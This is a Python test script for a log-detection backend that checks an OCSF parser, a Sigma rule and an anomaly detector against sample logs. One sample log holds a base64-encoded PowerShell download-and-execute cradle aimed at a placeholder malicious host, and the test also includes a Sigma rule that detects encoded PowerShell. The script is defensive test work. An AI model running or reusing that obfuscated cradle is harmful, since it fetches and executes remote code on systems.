import sys
import os

# Add backend root directory to path
backend_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
if backend_dir not in sys.path:
    sys.path.insert(0, backend_dir)


from app.detection.parser import parse_log_batch, OCSFEventClass
from app.detection.sigma_compiler import SigmaCompiler
from app.detection.anomaly_detector import MLAnomalyDetector, calculate_shannon_entropy

sample_logs = """<86>Oct 11 14:22:10 mail sshd[24101]: Failed password for invalid user admin from 192.168.1.152 port 50122 ssh2
CEF:0|ThreatAnalyser|CollectorAgent|1.0|PROC_01|PowerShell Obfuscated Execution|Medium|shost=device01 filePath=powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALQB1AHAAZABhAHQAZQAuAGUAeABhAG0AcABsAGUALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA== proc=powershell.exe pid=4312
{"event_category": "network", "src_ip": "10.0.0.12", "src_port": 443, "dest_ip": "185.220.101.5", "dest_port": 9001, "protocol": "TCP"}"""

print("1. Testing OCSF Parser...")
events = parse_log_batch(sample_logs, org_id="org_test")
print(f"[+] Parsed {len(events)} events successfully.")
for i, e in enumerate(events, 1):
    ocsf = e["normalized"]["ocsf"]
    print(f"  Event #{i}: type={e['event_type']}, user={e['user']}, src_ip={e['src_ip']}, ocsf_class={ocsf['class_uid']}")

print("\n2. Testing Sigma Rules Compiler...")
sigma_yaml = """
title: Suspicious PowerShell Obfuscation
detection:
    selection:
        commandline|contains:
            - '-encodedcommand'
            - '-enc'
    condition: selection
level: high
"""
rule = SigmaCompiler.compile_rule(sigma_yaml)
matches = [e for e in events if rule.matches(e)]
print(f"[+] Sigma compiled successfully. Matching events: {len(matches)} (Expected: 1)")
assert len(matches) == 1, f"Expected 1 match, got {len(matches)}"

print("\n3. Testing ML Anomaly Detector...")
detector = MLAnomalyDetector(anomaly_threshold=0.60)
findings = detector.score("org_test", events)
print(f"[+] Anomaly detector scored events. Findings: {len(findings)}")
for f in findings:
    print(f"  Finding on event #{f['event_index'] + 1} (Score: {f['score']}): {f['reason']}")

print("\n>>> ALL TESTS PASSED SUCCESSFULLY! <<<")
